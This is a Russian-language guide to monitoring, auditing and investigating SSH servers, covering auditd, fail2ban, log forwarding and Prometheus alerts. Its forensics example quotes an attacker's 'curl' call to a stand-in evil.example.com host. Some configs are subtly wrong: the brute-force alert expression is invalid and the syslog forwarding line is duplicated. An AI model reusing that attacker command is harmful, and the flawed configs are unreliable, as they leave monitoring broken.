# SSH — мониторинг и аудит сервера

## Определения

**SSH Monitoring** — процесс сбора, анализа и визуализации данных о работе SSH-сервера: логи аутентификации, активные сессии, попытки несанкционированного доступа.

**SSH Auditing** — проверка конфигурации и состояния безопасности сервера на соответствие стандартам.

**SSH Forensics** — ретроспективный анализ логов для расследования инцидентов: выявление источника атаки, времени входа и выполненных действий.

**Log Aggregation** — процесс сбора логов с множества хостов в централизованное хранилище (SIEM, ELK, Graylog) для корреляции событий и долгосрочного хранения.

**SIEM (Security Information and Event Management)** — система, агрегирующая логи безопасности, применяющая правила корреляции и генерирующая инциденты. В контексте SSH используется для обнаружения аномалий входа, brute-force и account takeover.

**KRL (Key Revocation List)** — список отозванных публичных ключей и сертификатов. Мониторинг KRL позволяет обнаружить использование скомпрометированных учетных данных.

## Предварительные требования

### Аппаратные и программные требования

| Компонент | Минимум | Рекомендация |
| :--- | :--- | :--- |
| **ОС** | Linux с systemd (RHEL 8+, Debian 11+, Ubuntu 22.04+) | Актуальная LTS-версия с исправлениями безопасности |
| **OpenSSH** | 8.8p1 | 9.8p1+ (поддержка расширенного логирования, PQC) |
| **Хранилище** | 2 GB свободного места | SSD с запасом 20 GB+ для логов auditd и journald |
| **Память** | 1 GB | 4 GB+ при нагрузке >500 сессий/мин |

### Инициализация окружения

```bash
# 1. Проверка версии OpenSSH
ssh -V
# → OpenSSH_9.8p1, OpenSSL_3.0.2 ...

# 2. Установка необходимых пакетов
# Debian/Ubuntu:
sudo apt update && sudo apt install -y openssh-server auditd fail2ban ssh-audit jq

# RHEL/CentOS/Fedora/Rocky:
sudo dnf install -y openssh-server audit fail2ban ssh-audit jq

# 3. Включение и запуск служб
sudo systemctl enable --now auditd
sudo systemctl enable --now fail2ban
sudo systemctl enable --now sshd

# 4. Создание директории для кастомных конфигураций мониторинга
sudo mkdir -p /etc/ssh/sshd_config.d
sudo chmod 755 /etc/ssh/sshd_config.d

# 5. Резервная копия заводского конфига
sudo cp /etc/ssh/sshd_config /etc/ssh/sshd_config.orig
sudo chmod 600 /etc/ssh/sshd_config.orig
```

## Основные концепции

### Архитектура журналирования SSH

События SSH проходят через несколько слоев логирования. Понимание архитектуры необходимо для настройки корректного сбора и предотвращения потерь данных.

```
Клиентское подключение
        |
        v
  +-------------+
  |   sshd      |  -- генерация событий (AUTH, session open/close)
  +------+------+
         |
         +---> journald (systemd-journald) -- основной сбор stdout/stderr
         |        |
         |        +---> /var/log/journal/ (персистентное хранилище)
         |        +---> /run/log/journal/ (временное хранилище)
         |
         +---> syslog (rsyslog / syslog-ng) -- фильтрация и пересылка
         |        |
         |        +---> /var/log/auth.log (Debian/Ubuntu)
         |        +---> /var/log/secure (RHEL/CentOS)
         |        +---> Удаленный syslog-сервер
         |
         +---> auditd (Linux Audit Daemon) -- ядерный аудит, несужемый формат
                  |
                  +---> /var/log/audit/audit.log
                  +---> ausearch / aureport для анализа
```

**journald:** Логирует stdout/stderr демона sshd. Быстрый, структурированный, поддерживает метаданные. По умолчанию на большинстве современных дистрибутивов.

**rsyslog / syslog-ng:** Классические syslog-демоны. Обеспечивают фильтрацию по facility/severity, запись в файлы и удаленную пересылку. Используются для долгосрочного хранения и интеграции с внешними SIEM.

**auditd:** Работает на уровне ядра, перехватывает syscalls. Записывает события в несуженом формате, защищенном от изменения. Гарантирует фиксацию даже при компрометации пользовательского пространства. Подробнее: [auditd](../../../SystemAdministration/Logging/auditd.md).

### Журналы регистрации (Логи) SSH

В современных Linux-системах события SSH фиксируются в текстовых логах и бинарных базах данных.

| Файл / Источник | Система | Содержание |
| :--- | :--- | :--- |
| `/var/log/auth.log` | Debian/Ubuntu | События аутентификации (SSH, sudo, PAM) |
| `/var/log/secure` | RHEL/CentOS | Аналог `auth.log` |
| `journalctl -u ssh` | systemd | Системный журнал демона SSH |
| `/var/log/btmp` | Все | Неудачные попытки входа (просмотр через `lastb`) |
| `/var/log/wtmp` | Все | История успешных входов/выходов (просмотр через `last`) |
| `/var/log/lastlog` | Все | Время последнего входа каждого пользователя |
| `/var/log/audit/audit.log` | Все (с auditd) | Ядерные события: доступ к sshd_config, ключам, execve |

> **Debian 13+, Ubuntu 24.10+, Fedora 43+:** `last`, `lastb` и `lastlog` **удалены** из util-linux/login: форматы `wtmp`/`btmp`/`lastlog` не переживают 2038 год, upstream отказался от их доработки (Debian release notes 5.1.9). Замены: `wtmpdb last` (пакеты `wtmpdb`, `libpam-wtmpdb`), `lslogins --failed` (вместо `lastb`), `lastlog2` (пакеты `lastlog2`, `libpam-lastlog2`). На этих дистрибутивах приоритетным источником истории входов остаётся `journalctl -u ssh` / `journalctl -u sshd` — он не зависит от устаревших бинарных форматов. На Debian 12 / Ubuntu 24.04 LTS команды `last`/`lastb`/`lastlog` ещё работают, но новые системы лучше сразу строить на journalctl + wtmpdb.

### Уровни и параметры логирования sshd

Настройка детализации в `/etc/ssh/sshd_config` осуществляется двумя основными директивами:

| Параметр | Описание | Значение по умолчанию |
| :--- | :--- | :--- |
| **LogLevel** | Глубина детализации событий | `INFO` |
| **SyslogFacility** | Категория (facility) системного журнала | `AUTH` (или `AUTHPRIV`) |

#### Уровни LogLevel

| Уровень | Описание | Содержание |
| :--- | :--- | :--- |
| **INFO** | Стандартный | Успешные/неудачные входы, завершение сессий. |
| **VERBOSE** | Рекомендуемый | Добавляет отпечатки (fingerprints) ключей и методы аутентификации. |
| **DEBUG[1-3]** | Отладочный | Максимальная детализация протокола (только для поиска багов). |

**Рекомендация:** Для полноценного аудита безопасности используйте `LogLevel VERBOSE`. Это позволяет связать конкретный публичный ключ с сессией пользователя в логах.

### Ротация и хранение логов

Неограниченный рост логов приводит к заполнению диска и потере данных. Настройте ротацию на уровне journald, rsyslog и auditd.

#### journald

```bash
# Проверка текущих настроек
journalctl --disk-usage
cat /etc/systemd/journald.conf | grep -E "SystemMaxUse|MaxRetentionSec|MaxFileSec"

# Рекомендации для production:
# SystemMaxUse=2G          — максимальный объем на диске
# MaxRetentionSec=1month   — хранение 1 месяц (для compliance)
# MaxFileSec=1day          — ротация файлов раз в день
```

#### rsyslog

```bash
# Проверка правил ротации
cat /etc/logrotate.d/rsyslog

# Ручная ротация
sudo logrotate -f /etc/logrotate.d/rsyslog
```

#### auditd

```bash
# Проверка настроек ротации auditd
cat /etc/audit/auditd.conf | grep -E "max_log_file|num_logs|log_file"

# Рекомендации:
# max_log_file = 50MB   — максимальный размер файла
# num_logs = 5          — количество файлов в ротации
# log_format = ENRICHED  — enriched формат с метаданными
```

### auditd: ядерный аудит событий SSH

`auditd` обеспечивает детализированное журналирование событий безопасности на уровне ядра, включая чтение/запись критичных файлов SSH и все попытки аутентификации. В отличие от стандартного journald, auditd:
- Записывает события в несужемый формат (нельзя изменить без перезагрузки)
- Поддерживает метки ключей (`-k`) для группировки
- Интегрируется с SIEM (Wazuh, Splunk, ELK) через `audisp` или `ausearch`
- Гарантирует целостность журнала даже при переполнении диска (`-f` режим panic)

**Минимальный набор правил для SSH:**

```bash
# Наблюдение за sshd_config (любые изменения)
sudo auditctl -w /etc/ssh/sshd_config -p wa -k ssh_config

# Наблюдение за директорией хостовых ключей
sudo auditctl -w /etc/ssh/ssh_host_*_key -p rw -k ssh_host_keys

# Наблюдение за authorized_keys всех пользователей
sudo auditctl -w /home/ -p rwxa -k ssh_user_auth

# Наблюдение за выполнением sshd
sudo auditctl -w /usr/sbin/sshd -p x -k sshd_execution
```

Для постоянных правил используйте файлы в `/etc/audit/rules.d/`. Детальный набор правил описан в [SSH Hardening Best Practices](./ssh_hardening_best_practices.md#аудит-событий-ssh-через-auditd).

### Типичные паттерны в журналах

Анализ логов (`/var/log/auth.log` или `journalctl`) позволяет быстро диагностировать состояние сервера:

| Фрагмент лога | Значение |
| :--- | :--- |
| `Accepted publickey for user...` | Успешный вход по SSH-ключу. |
| `Failed password for user...` | Неудачная попытка входа (неверный пароль). |
| `Invalid user admin from...` | Попытка входа под несуществующим пользователем (признак бота). |
| `Connection closed by authenticating user` | Соединение разорвано до завершения аутентификации. |
| `Bad ownership or modes for directory` | SSH проигнорировал ключ из-за небезопасных прав на `~/.ssh`. |
| `User root from ... not allowed because...` | Попытка входа root при `PermitRootLogin no`. |
| `Received disconnect from ...: 11: Bye Bye [preauth]` | Отказ в pre-auth (неверный ключ, отозванный сертификат, `ForceCommand`). |
| `Certificate invalid: expired` | Истек срок действия SSH-сертификата. |
| `principal mismatch` | Имя пользователя не входит в список `Principals` сертификата. |
| `pam_faillock(sshd:auth)` | Блокировка учетной записи после N неудачных попыток. |

### Модель угроз при мониторинге

| Угроза | Описание | Метод обнаружения |
| :--- | :--- | :--- |
| **Brute-force** | Автоматизированный перебор паролей/имен. | Анализ `Failed password`, пороговые алерты по IP. |
| **Credential stuffing** | Использование украденных ключей/паролей с других ресурсов. | Гео-анализ, анализ User-Agent, correlation с threat intel. |
| **Account takeover** | Вход под скомпрометированным ключом из нового гео/IP. | Аномалия: новое устройство, необычное время, batch-команды. |
| **Логическое подавление (Log tampering)** | Удаление/изменение записей злоумышленником с root-доступом. | auditd (несужемый формат), централизованная пересылка, immutable bit. |
| **SSH CA compromise** | Компрометация приватного ключа CA. | Мониторинг `TrustedUserCAKeys` на хостах, anomaly detection по principals. |
| **Логовая бомба (Log DoS)** | Генерация гигантского объема логов для заполнения диска. | Лимиты journald, rate limiting fail2ban, alerting по `% of disk used`. |

## Практические сценарии

### Сценарий 1: Обнаружение попыток перебора (Brute-force)

**Задача:** Выявить IP-адреса с аномальным количеством неудачных входов для последующей блокировки.

```bash
# Топ-10 IP-адресов по неудачным входам (Debian/Ubuntu)
grep "Failed" /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn | head -10
# → 1542 192.168.1.50
# → 841  45.12.33.10

# Проверка через journalctl (за последние 24 часа)
journalctl -u ssh --since "24 hours ago" | grep "Failed" | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn

# Просмотр бинарного журнала неудачных входов (всех, включая консольные)
# На Debian 13+/Ubuntu 24.10+: lslogins --failed (lastb удалён, см. примечание выше)
lastb | head -20
# → admin   ssh:notty    1.2.3.4    Fri Aug  8 12:00 - 12:00 (00:00)

# Валидация: fail2ban статус (должен показывать забаненные IP)
sudo fail2ban-client status sshd
# → Status for the jail: sshd
# → |- Filter
# → |  |- Currently failed: 3
# → |  |- Total failed:     1542
# → |  `- Journal matches:  ...
# → `- Actions
# →    |- Currently banned: 12
# →    |- Total banned:     45
# →    `- Banned IP list:   45.12.33.10 192.168.1.50 ...
```

### Сценарий 2: Аудит успешных подключений

**Задача:** Получить хронологию входов легитимных пользователей и проверить их активность.

```bash
# Список последних 20 успешных входов
# На Debian 13+/Ubuntu 24.10+: wtmpdb last (last удалён, см. примечание выше)
last -n 20
# → userpts/0  192.168.1.10  Fri Aug  8 10:00   still logged in

# История входов конкретного пользователя
last username

# Просмотр времени последнего входа всех системных пользователей
# На Debian 13+/Ubuntu 24.10+: lastlog2 (lastlog удалён)
lastlog | grep -v "Never logged in"
# → root             pts/0    192.168.1.5    Fri Aug  8 09:15:20 +0300 2026

# Валидация: проверка, что вход зафиксирован в journald
journalctl -u sshd --since "1 hour ago" | grep "Accepted publickey"
# → Aug  8 10:00:00 server sshd[1234]: Accepted publickey for user from 192.168.1.10 port 54321 ssh2
```

### Сценарий 3: Мониторинг активных сессий в реальном времени

**Задача:** Выявить подозрительную активность или забытые открытые сессии.

```bash
# Список пользователей, время подключения и выполняемые команды
w
# → 13:00:01 up 10 days,  2:30,  2 users,  load average: 0.05, 0.10, 0.05
# → USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
# → admin    pts/0    10.0.0.5         12:45    1.00s  0.11s  0.01s w

# Просмотр процессов конкретных SSH-сессий
ps -ef | grep [s]shd:
# → root      1234  1100  0 12:45 ?  00:00:00 sshd: admin [priv]
# → admin     1235  1234  0 12:45 ?  00:00:00 sshd: admin@pts/0

# Проверка сетевых соединений на порту SSH (по умолчанию 22)
sudo ss -tnp | grep :22
# → ESTAB 0 0 192.168.1.100:22 10.0.0.5:54321 users:(("sshd",pid=1234,fd=4))

# Валидация: поиск сессий, превышающих лимит бездействия
sudo sshd -T | grep clientalive
# → clientaliveinterval 300
# → clientalivecountmax 0
```

### Сценарий 4: Расширенный аудит SFTP

**Задача:** Записывать в лог все операции с файлами (загрузка, удаление, переименование).

```bash
# 1. Изменить настройку подсистемы в /etc/ssh/sshd_config
# Добавить флаги -f (facility) и -l (level)
Subsystem sftp /usr/lib/openssh/sftp-server -f AUTHPRIV -l INFO

# 2. Перезапустить службу
sudo systemctl restart ssh

# Валидация: выполнить SFTP-операцию и проверить лог
sftp user@server
sftp> put /tmp/test.txt
sftp> rm test.txt
sftp> quit

# Проверка логов
sudo journalctl -u sshd --since "5 minutes ago" | grep -i "sftp"
# → sftp[5678]: open "/upload/test.txt" flags WRITE ...
# → sftp[5678]: close "/upload/test.txt" ...
```

### Сценарий 5: Автоматизированный compliance-check в CI/CD

**Задача:** Интегрировать проверку безопасности SSH-конфигурации в пайплайн развертывания.

```bash
# 1. Установка ssh-audit (если отсутствует)
sudo apt install -y ssh-audit

# 2. Запуск аудита на целевом хосте (через SSH)
ssh-audit --no-colors server.example.com 2>/dev/null | tee /tmp/ssh-audit-report.txt

# 3. Извлечение итоговой оценки (оценка A-F)
SCORE=$(ssh-audit --no-colors server.example.com 2>/dev/null | grep -E "^\s*[A-F]\)" | head -1 | awk '{print $1}')

# 4. Проверка порогового значения (например, минимальная оценка B)
if [[ "$SCORE" < "B" ]]; then
  echo "FAIL: SSH security score $SCORE below threshold B"
  exit 1
else
  echo "PASS: SSH security score $SCORE"
fi

# 5. Проверка на запрещенные директивы в sshd_config
ssh user@server "sudo sshd -T" | grep -E "passwordauthentication yes|permitrootlogin yes"
# → (пустой вывод = запрещенные директивы отсутствуют)

# Валидация: пайплайн завершается успешно только при отсутствии критических отклонений
```

### Сценарий 6: Расследование инцидентов (Forensics)

**Задача:** Восстановить хронологию действий злоумышленника после компрометации.

```bash
# 1. Определить временное окно инцидента
sudo journalctl -u sshd --since "2026-08-08 08:00" --until "2026-08-08 10:00" > /tmp/incident_window.log

# 2. Найти все входы в этом окне
grep "Accepted" /tmp/incident_window.log
# → Aug  8 08:15:22 server sshd[1234]: Accepted publickey for admin from 203.0.113.5 port 54321 ssh2

# 3. Найти все неудачные попытки перед входом (подсказка о методе взлома)
grep "Failed" /tmp/incident_window.log | head -20

# 4. Найти команды, выполненные в сессии (если Session Recording включен)
sudo ausearch -k ssh_successful_login -i --start "08/08/2026 08:00" --end "08/08/2026 10:00"
# → type=USER_CMD msg=audit(1723127722.123:456): argc=3 a1="curl" a2="-s" a3="http://evil.example.com/..."

# 5. Проверить, не добавлен ли новый ключ в authorized_keys
sudo ausearch -k ssh_user_auth -i --start "08/08/2026 08:00" --end "08/08/2026 10:00"
# → type=PATH msg=audit(1723127722.123:457): item=0 name="/home/admin/.ssh/authorized_keys" ...

# 6. Экспорт результатов для отчета
sudo aureport --auth --start 08/08/2026 08:00 --end 08/08/2026 10:00 --format csv > /tmp/auth_report.csv
```

### Сценарий 7: Prometheus Blackbox Exporter для мониторинга SSH

**Задача:** Мониторинг доступности SSH-серверов через Prometheus и визуализация в Grafana.

**Установка Blackbox Exporter:**
```bash
# Скачивание и установка
wget https://github.com/prometheus/blackbox_exporter/releases/download/v0.25.0/blackbox_exporter-0.25.0.linux-amd64.tar.gz
tar xzf blackbox_exporter-0.25.0.linux-amd64.tar.gz
sudo mv blackbox_exporter-0.25.0.linux-amd64/blackbox_exporter /usr/local/bin/

# Создание systemd-сервиса
sudo tee /etc/systemd/system/blackbox_exporter.service << 'EOF'
[Unit]
Description=Blackbox Exporter
After=network.target

[Service]
User=blackbox
ExecStart=/usr/local/bin/blackbox_exporter --config.file=/etc/blackbox_exporter/config.yml
Restart=always

[Install]
WantedBy=multi-user.target
EOF

sudo systemctl daemon-reload
sudo systemctl enable --now blackbox_exporter
```

**Конфигурация Blackbox Exporter:**
```yaml
# /etc/blackbox_exporter/config.yml
modules:
  ssh_connect:
    prober: tcp
    timeout: 5s
    tcp:
      preferred_ip_protocol: ip4
      query_response:
        - send: ""
        - expect: "^SSH-2.0-"
```

**Настройка Prometheus:**
```yaml
# prometheus.yml
scrape_configs:
  - job_name: 'ssh-servers'
    scrape_interval: 30s
    static_configs:
      - targets:
        - ssh-server-1:22
        - ssh-server-2:22
        - bastion:22
    metrics_path: /probe
    params:
      module: [ssh_connect]
    relabel_configs:
      - source_labels: [__address__]
        target_label: __param_target
      - source_labels: [__param_target]
        target_label: instance
      - target_label: __address__
        replacement: blackbox-exporter:9115
```

**Алерты в Prometheus:**
```yaml
# alerts.yml
groups:
  - name: ssh-alerts
    rules:
      - alert: SSHServerDown
        expr: probe_success{job="ssh-servers"} == 0
        for: 2m
        labels:
          severity: critical
        annotations:
          summary: "SSH-сервер {{ $labels.instance }} недоступен"
          description: "SSH-сервер не отвечает более 2 минут."

      - alert: SSHHighLatency
        expr: probe_duration_seconds{job="ssh-servers"} > 5
        for: 5m
        labels:
          severity: warning
        annotations:
          summary: "Высокая задержка SSH: {{ $labels.instance }}"
          description: "SSH-подключение занимает более 5 секунд."

      - alert: SSHBruteForceDetected
        expr: rate(node_systemd_unit_state{unit="sshd.service"} == 1[5m]) > 0.1
        for: 1m
        labels:
          severity: warning
        annotations:
          summary: "Обнаружена brute-force атака на {{ $labels.instance }}"
```

**Grafana Dashboard (SSH Overview):**
```json
{
  "panels": [
    {
      "title": "SSH Availability",
      "type": "stat",
      "targets": [{
        "expr": "probe_success{job=\"ssh-servers\"}",
        "legendFormat": "{{ instance }}"
      }],
      "fieldConfig": {
        "defaults": {
          "mappings": [
            { "type": "value", "options": { "0": { "text": "DOWN", "color": "red" }, "1": { "text": "UP", "color": "green" } } }
          ]
        }
      }
    },
    {
      "title": "SSH Connection Latency",
      "type": "timeseries",
      "targets": [{
        "expr": "probe_duration_seconds{job=\"ssh-servers\"}",
        "legendFormat": "{{ instance }}"
      }]
    }
  ]
}
```

### Сценарий 8: Централизовальная агрегация логов и SIEM

**Задача:** Настроить пересылку SSH-логов на центральный сервер для корреляции и долгосрочного хранения.

```bash
# 1. Настройка rsyslog на клиенте для пересылки SSH-логов
sudo tee /etc/rsyslog.d/30-ssh-forward.conf << 'EOF'
# Пересылка только событий SSH (facility AUTH)
authpriv.* @siem.example.com:514
authpriv.* @siem.example.com:514
EOF

# 2. Настройка журналирования на сервере (SIEM-side, пример для rsyslog)
sudo tee /etc/rsyslog.d/ssh-remote.conf << 'EOF'
# Прием удаленных логов
module(load="imtcp")
input(type="imtcp" port="514")

# Сохранение в отдельный файл с ротацией
if $programname == 'sshd' or $syslogfacility-text == 'authpriv' then {
  /var/log/remote/ssh/%HOSTNAME%/%$YEAR%-%$MONTH%-%$DAY%.log
  stop
}
EOF

# 3. Перезапуск rsyslog
sudo systemctl restart rsyslog

# 4. Валидация: генерация тестового события и проверка на SIEM
sudo logger -p authpriv.info "TEST SSH LOG FORWARDING"
# На SIEM-сервере:
grep "TEST SSH LOG FORWARDING" /var/log/remote/ssh/client.example.com/*.log
```

## Диагностика и устранение неполадок

### Типичные ошибки мониторинга и их решения

| Ошибка / Симптом | Причина | Решение |
| :--- | :--- | :--- |
| Логи SSH отсутствуют в journald | `ForwardToSyslog=yes` в journald.conf пересылает логи в rsyslog, минуя journald | Проверить `/etc/systemd/journald.conf`; для полноты хранилища используйте `ForwardToSyslog=no` или настройте rsyslog |
| auditd не записывает события | Буфер переполнен или правила не загружены | `sudo auditctl -s` (проверка backlog), `sudo auditctl -l` (список правил), увеличить `-b 8192` |
| Логи не ротируются | Неправильные права в `/etc/logrotate.d/` или диск заполнен | `sudo logrotate -d /etc/logrotate.d/rsyslog` (dry-run), проверить `df -h` |
| `lastb` показывает старые записи | `/var/log/btmp` поврежден или слишком велик | `sudo truncate -s 0 /var/log/btmp` (осторожно, удаляет историю) |
| fail2ban не банит IP | Фильтр не срабатывает (regex mismatch) или jail отключен | `sudo fail2ban-client status sshd`, `sudo fail2ban-regex /var/log/auth.log /etc/fail2ban/filter.d/sshd.conf` |
| Потеря логов при перезагрузке | journald работает в режиме volatile (только `/run/log/journal/`) | `sudo mkdir -p /var/log/journal && sudo systemd-tmpfiles --create --prefix /var/log/journal` |
| Clock skew между серверами | Разное время на хостах искажает корреляцию в SIEM | Настроить NTP: `sudo timedatectl set-ntp true`, проверить `timedatectl status` |
| auditd: `no space left on device` | Лог заполнил диск, auditd перешел в panic mode | Увеличить `num_logs`, настроить `max_log_file`, проверить `df -h /var/log/audit/` |

### Диагностический чеклист

```bash
# 1. Проверка конфигурации journald
sudo journalctl --disk-usage
sudo journalctl -b -p err | head -20

# 2. Валидация sshd конфигурации
sudo sshd -T | grep -E "loglevel|syslogfacility"

# 3. Проверка статуса auditd
sudo systemctl status auditd
sudo auditctl -s
sudo auditctl -l | grep ssh

# 4. Проверка fail2ban
sudo fail2ban-client status sshd
sudo fail2ban-client status

# 5. Проверка логов на наличие ошибок
sudo journalctl -u sshd --since "10 minutes ago" | grep -E "error|refused|disconnect|Failed"

# 6. Проверка ротации логов
sudo logrotate -d /etc/logrotate.d/rsyslog
sudo cat /etc/audit/auditd.conf | grep -E "max_log_file|num_logs"

# 7. Проверка дискового пространства
df -h /var/log /var/log/audit /run/log/journal

# 8. Проверка корректности часов (критично для SIEM)
timedatectl status
# → NTP synchronized: yes
# → System clock synchronized: yes
```

## Рекомендации по безопасности

1.  **Целостность логов:** Используйте `auditd` с режимом `-e 2` (immutable) или пересылайте логи на удаленный SIEM-сервер сразу после генерации. Это предотвращает их удаление злоумышленником с root-доступом.
2.  **Минимальные права доступа:** Файлы логов должны принадлежать `root:adm` (или `root:utmp`) с правами `640`. Запретите доступ на запись для всех, кроме auditd и syslog.
3.  **Ротация:** Настройте ротацию journald (`SystemMaxUse`), rsyslog (`logrotate`) и auditd (`max_log_file`). Рекомендуемый срок хранения — 90 дней для compliance, 1 год для критической инфраструктуры.
4.  **NTP:** Все хосты должны синхронизировать время через NTP. Clock skew >1с ломает корреляцию событий в SIEM.
5.  **Rate limiting:** Ограничьте скорость генерации логов через `MaxStartups` в `sshd_config` (защита от логовой бомбы).
6.  **Изоляция логов auditd:** Не храните `audit.log` на том же разделе, что и корневая ФС. При заполнении auditd переходит в panic mode (`-f 2`) и блокирует систему, предотвращая потерю аудита.
7.  **CI/CD интеграция:** Добавьте `ssh-audit` в пайплайн деплоя. Блокируйте мерж при падении оценки ниже порогового значения.
8.  **Шифрование при пересылке:** Используйте TLS для syslog-пересылки (rsyslog с `imtcp` + stunnel, или syslog-ng с TLS) или VPN-туннель между хостом и SIEM.

## Крайние случаи и ограничения

| Случай | Поведение / Риск | Рекомендация |
| :--- | :--- | :--- |
| **Утечка диска логами** | При abrupt spike (атака, bug) логи заполняют диск, сервер зависает. | Настройте `SystemMaxUse` в journald, `max_log_file` в auditd, мониторинг диска в Prometheus/Zabbix. |
| **Clock skew в распределенной среде** | Корреляция событий между хостами невозможна при разнице >1 сек. | NTP chrony с синхронизацией через внутренний сервер времени. |
| **journald в volatile-режиме** | При перезагрузке все логи теряются. | Создайте persistent-директорию: `mkdir -p /var/log/journal && systemd-tmpfiles --create --prefix /var/log/journal` |
| **auditd panic mode** | При ошибке записи auditd может остановить систему (`-f 2`). | Используйте отдельный раздел для `/var/log/audit/`, мониторьте `auditd` через `systemd-analyze critical-chain auditd.service`. |
| **Chroot и SFTP** | Внутри chroot пользователь не видит системных логов. | Логи SFTP записываются через `Subsystem sftp ... -f AUTHPRIV -l INFO` и доступны на хосте. |
| **SSH CA и отслеживание principals** | При отзыве CA все сертификаты становятся невалидны, что создает волну `Certificate invalid` в логах. | Реализуйте плавную ротацию CA (см. [ssh_certificate_authentication.md](./ssh_certificate_authentication.md)). |
| **fail2ban и DNS-блокировки** | При блокировке по DNS-имени (не IP) при смене IP злоумышленник возвращается. | Используйте `banaction = iptables-multiport` с блокировкой по IP, а не `hostsdeny`. |
| **Логирование в контейнерах** | В контейнере journald может отсутствовать, логи идут в stdout Docker. | Для SSH в контейнерах настройте драйвер логирования Docker (`json-file` с ротацией) и пересылку в SIEM через Vector/Fluentd. |

## Дополнительная информация

### Инструменты автоматизированного аудита

* **ssh-audit** — мощный инструмент для проверки безопасности конфигурации (алгоритмы, шифры, ключи).

  ```bash
  ssh-audit <hostname>
  ```

* **fail2ban** — стандарт де-факто для автоматической блокировки IP при обнаружении brute-force. См. [fail2ban: настройка и использование](../../Tools/fail2ban.md).

* **Lynis** — системный сканер безопасности, включающий глубокий аудит настроек SSH.

* **auditd / ausearch / aureport** — ядерный аудит и анализ несужемых логов. Подробнее: [auditd](../../../SystemAdministration/Logging/auditd.md).

* **jq** — обработка структурированных логов (JSON из journald или SIEM).

### Проверка конфигурации перед применением

Всегда проверяйте синтаксис конфига перед перезапуском демона, чтобы не потерять доступ к серверу:

```bash
# Проверка синтаксиса
sudo sshd -t

# Вывод итоговой конфигурации (с учетом всех include)
sudo sshd -T | grep -i "permitroot\|passwordauth\|loglevel"
```

### Критические директивы sshd для мониторинга

| Директива | Рекомендуемое значение | Влияние на мониторинг |
| :--- | :--- | :--- |
| **`LogLevel`** | `VERBOSE` | Включает fingerprint ключей в логи, критично для forensics. |
| **`SyslogFacility`** | `AUTHPRIV` | Отделяет SSH-события от обычных auth-событий для фильтрации. |
| **`Subsystem sftp`** | `-f AUTHPRIV -l INFO` | Включает логирование всех SFTP-операций. |
| **`MaxStartups`** | `10:30:60` | Ограничивает одновременные неавторизованные соединения, защита от логовой бомбы. |
| **`ClientAliveInterval`** | `300` | Позволяет обнаруживать зависшие сессии и чистить их. |
| **`ClientAliveCountMax`** | `0` | Немедленный разрыв при отсутствии активности. |

### См. также

* [SSH Troubleshooting](../ssh_troubleshooting.md) — решение проблем с подключением
* [SSH Hardening Best Practices](./ssh_hardening_best_practices.md) — укрепление безопасности, auditd правила
* [SSH Server Security Overview](./ssh_server_security_overview.md) — общая стратегия защиты
* [fail2ban: настройка и использование](../../Tools/fail2ban.md) — автоматическая блокировка атак
* [auditd](../../../SystemAdministration/Logging/auditd.md) — ядерный аудит, отслеживание изменений конфигурации SSH
* [Инструменты сетевого мониторинга](../../Tools/network_monitoring_tools.md) — перехват и анализ SSH-трафика
